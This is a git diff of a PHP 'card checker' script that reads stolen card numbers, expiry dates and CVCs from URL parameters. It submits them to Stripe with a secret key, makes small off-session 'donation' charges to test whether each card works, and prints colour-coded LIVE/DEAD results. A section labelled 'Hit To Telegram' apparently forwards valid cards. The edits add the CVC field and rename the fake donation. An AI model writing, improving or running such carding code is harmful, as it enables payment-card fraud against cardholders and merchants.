@@ -21,7 +21,7 @@ function multiexplode($seperator, $string){
     $two = explode($seperator[0], $one);
     return $two;
     };
-$domain = $_SERVER['HTTP_HOST'];
+
 $idd = $_GET['idd'];
 $amt = $_GET['cst'];
 if(empty($amt)) {
@@ -37,6 +37,10 @@ $lista = $_GET['lista'];
 
 if (strlen($mes) == 1) $mes = "0$mes";
 if (strlen($ano) == 2) $ano = "20$ano";
+
+
+
+
 
 //================= [ CURL REQUESTS ] =================//
 
@@ -61,7 +65,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 
 curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');  
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'');  
 
 $result1 = curl_exec($ch);  
 
@@ -106,7 +110,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 
 curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=Ghost Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=SoilMan Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
 
 $result2 = curl_exec($ch);  
 
@@ -129,6 +133,8 @@ if (strpos($result2, "rate_limit"))
 break;  
 
 }
+
+
 
 // ---------------------------------------------------- Hit To Telegram Start----------------------------
 $domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
@@ -304,7 +310,7 @@ elseif(strpos($result2,' "decline_code": "do_not_honor"')){
     echo '<font color=red><b>DEAD [ DO NOT HONOR ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
 }
 elseif(strpos($result2,'"cvc_check": "unchecked"')){
-    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM AT OWNER</span><br>';
+    echo '<font color=red><b>DEAD [ CVC_UNCHECKED : INFORM AT OWNER ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
 }
 elseif(strpos($result2,'"cvc_check": "fail"')){
     echo '<font color=red><b>DEAD [ CVC_CHECK ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
@@ -316,7 +322,7 @@ elseif(strpos($result2,'"cvc_check": "unavailable"')){
     echo '<font color=red><b>DEAD [ CVC_CHECK ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
 }
 elseif(strpos($result2,'"cvc_check": "unchecked"')){
-    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM TO OWNER」</span><br>';
+    echo '<font color=red><b>DEAD [ CVC_UNCHECKED : INFORM AT OWNER ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
 }
 elseif(strpos($result2,'"cvc_check": "fail"')){
     echo '<font color=red><b>DEAD [ CVC_CHECK ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
@@ -353,17 +359,12 @@ else {
 
 
 
-
 //echo "<br><b>Lista:</b> $lista<br>";
 //echo "<br><b>CVV Check:</b> $cvccheck<br>";
 //echo "<b>D_Code:</b> $dcode<br>";
 //echo "<b>Reason:</b> $reason<br>";
 //echo "<b>Risk Level:</b> $riskl<br>";
 //echo "<b>Seller Message:</b> $seller_msg<br>";
-
-
-// echo '<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ' [Re: </span><br>';
-
 //echo "<br><b>Result3: </b> $result2<br>";
 
 curl_close($ch);
